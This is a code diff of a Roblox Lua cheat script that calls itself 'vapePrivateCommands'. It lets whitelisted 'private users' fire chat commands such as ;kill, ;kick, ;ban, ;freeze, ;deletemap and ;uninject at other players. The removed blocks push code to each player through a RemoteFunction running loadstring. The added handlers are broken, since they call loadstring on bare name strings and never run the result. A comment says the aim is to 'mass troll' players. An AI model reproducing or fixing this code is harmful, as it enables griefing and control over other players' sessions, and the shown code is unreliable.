@@ -4,9 +4,13 @@ local player = game.Players.LocalPlayer
 local humanoid = player.Character:WaitForChild("Humanoid")
 local ChatService = game:GetService("Chat")
 
-local privateusers = {"GetReketed_1"}
+local privateUsers = {
+    "GetReketed_1",
+    "Player2",
+    "Player3"
+}
 
-local triggerPlayerName = privateusers  -- The player who can trigger the code execution
+local triggerPlayerName = privateUsers  -- The player who can trigger the code execution
 
 
 
@@ -320,8 +324,13 @@ vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
         print("Cmd Execution bypassed")
         -- Continue executing code here for the authorized user
         
-  --kill :D
-  if player.Name == privateusers and string.lower(message) == ";kill default" then
+        --kill :D
+  --[[
+
+
+
+
+        if player.Name == privateusers and string.lower(message) == ";kill default" then
     -- Insert the Lua code you want to execute here
     local codeToExecute2 = vapePrivateCommands.kill
     
@@ -346,184 +355,122 @@ vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
     end
 end
 
-                --Byfron
-                if player.Name == privateusers and string.lower(message) == ";byfron default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute2 = vapePrivateCommands.byfron
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player,codeToExecute2)
-                                    return loadstring(codeToExecute2)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute2)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
-
-                if player.Name == privateusers and string.lower(message) == ";rickroll default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute3 = vapePrivateCommands.rickroll
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute3)
-                                    return loadstring(codeToExecute3)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute3)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
 
 
-                if player.Name == privateusers and string.lower(message) == ";kick default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute4 = vapePrivateCommands.kick
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute4)
-                                    return loadstring(codeToExecute4)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute4)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
+
+  ]]
+
+  game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;kill " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute1 = "vapePrivateCommands.kill"
+            loadstring(Scripttoexecute1)
+        end
+    end)
+end)
+  
 
 
-                if player.Name == privateusers and string.lower(message) == ";ban default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute5 = vapePrivateCommands.ban
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute5)
-                                    return loadstring(codeToExecute5)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute5)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
 
 
-                if player.Name == privateusers and string.lower(message) == ";freeze default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute6 = vapePrivateCommands.freeze
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute6)
-                                    return loadstring(codeToExecute6)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute6)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;byfron " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute2 = "vapePrivateCommands.byfron"
+            loadstring(Scripttoexecute2)
+        end
+    end)
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;rickroll " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute3 = "vapePrivateCommands.rickroll"
+            loadstring(Scripttoexecute3)
+        end
+    end)
+end)
 
 
-                if player.Name == privateusers and string.lower(message) == ";deletemap default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute7 = vapePrivateCommands.deletemap
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute7)
-                                    return loadstring(codeToExecute7)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute7)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;ban " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute4 = "vapePrivateCommands.ban"
+            loadstring(Scripttoexecute4)
+        end
+    end)
+end)
 
-                if player.Name == privateusers and string.lower(message) == ";uninject default" then
-                    -- Insert the Lua code you want to execute here
-                    local codeToExecute8 = vapePrivateCommands.uninject
-                    
-                    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                        if otherPlayer ~= player then
-                            local success, err = pcall(function()
-                                local replicatedStorage = game:GetService("ReplicatedStorage")
-                                local remoteFunction = Instance.new("RemoteFunction")
-                                remoteFunction.Name = "ExecuteCode"
-                                remoteFunction.Parent = replicatedStorage
-                                remoteFunction.OnServerInvoke = function(player, codeToExecute8)
-                                    return loadstring(codeToExecute8)()
-                                end
-                                remoteFunction:InvokeClient(otherPlayer, codeToExecute8)
-                                remoteFunction:Destroy()
-                            end)
-                            
-                            if not success then
-                                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                            end
-                        end
-                    end
-                end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;freeze " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute5 = "vapePrivateCommands.freeze"
+            loadstring(Scripttoexecute5)
+        end
+    end)
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;deletemap " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute6 = "vapePrivateCommands.deletemap"
+            loadstring(Scripttoexecute6)
+        end
+    end)
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " ;uninject " .. message)
+            -- Execute your desired script here
+            local Scripttoexecute7 = "vapePrivateCommands.uninject"
+            loadstring(Scripttoexecute7)
+        end
+    end)
+end)
                 print("Commands Successfully Loaded Have Fun!")
+
+                --Hehe i like uninject, mass troll while doing a video >:)
     
+
+
+                --[[
+
+
+
+                local privateUsers = {
+    "Player1",
+    "Player2",
+    "Player3"
+}
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(privateUsers, player.Name) then
+            print(player.Name .. " said: " .. message)
+            -- Execute your desired script here
+            -- Example: game.ServerScriptService.YourScriptName:Clone().Parent = player
+        end
+    end)
+end)
+
+
+
+
+                --]]
+
+                
